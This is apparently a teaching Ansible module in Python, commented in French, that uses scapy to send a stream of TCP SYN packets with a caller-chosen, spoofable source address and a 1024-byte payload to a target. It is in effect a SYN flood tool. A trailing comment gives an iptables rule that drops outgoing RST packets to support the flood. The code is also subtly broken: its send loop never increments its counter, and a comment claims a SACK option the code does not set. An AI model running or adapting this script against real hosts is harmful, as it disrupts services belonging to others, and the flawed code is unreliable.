#pédagogique 

from ansible.module_utils.basic import AnsibleModule
from scapy.all import *

module = AnsibleModule(
        argument_spec=dict(
            ip_dest = dict(required=True, type='str'),
            ip_source = dict(required=True, type='str'),
            port_dest = dict(required=True, type='int'),
            port_source = dict(required=True, type='int'),
			nb_packets = dict(required=True, type='int'),
		)
)

ip_dest = module.params.get('ip_dest')
ip_source = module.params.get('ip_source')
port_dest = module.params.get('port_dest')
port_source = module.params.get('port_source')
nb_packets = module.params.get('nb_packets')

# Créez un paquet IP avec l'adresse source et de destination appropriées
ip_packet = IP(src=ip_source, dst=ip_dest)

# Créez un paquet TCP avec l'option SACK permitted
tcp_packet = TCP(sport=port_source, dport=port_dest, flags="S")
raw = Raw(b"X"*1024)

# Affichez le paquet pour vérifier son contenu
print(ip_packet / tcp_packet / raw)
i=0
while(i<nb_packets):
	send(ip_packet / tcp_packet / raw)

# module.exit_json(changed=False, resultat = ) #ici faudrait faire un truc pour voir si on a bien reçu le SYN-ACK je pense


#sudo iptables -A OUTPUT -p tcp -d <cible> --tcp-flags RST RST -j DROP
